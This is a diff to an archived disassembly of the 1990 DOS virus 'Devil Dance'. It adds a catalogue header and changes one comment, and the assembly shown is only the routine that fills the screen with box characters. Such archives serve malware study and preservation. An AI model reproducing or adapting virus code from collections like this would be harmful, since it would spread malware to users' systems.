@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      D
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ; virus Devil Dance
 ;
 ; disassembled by Marek A. Filipiak October 31, 1990
@@ -274,7 +285,7 @@
 0D83 8ED8          MOV     DS,AX
 0D85 33FF          XOR     DI,DI        ; clear screen location pointer
 0D87 B407          MOV     AH,07        ; attribute
-0D89 B0B1          MOV     AL,B1        ; chracter � (177)
+0D89 B0B1          MOV     AL,B1        ; chracter � (177)
 0D8B B9D007        MOV     CX,07D0      ; size of screen
 0D8E F3            REPZ
 0D8F AB            STOSW                ; fill screen with box character 
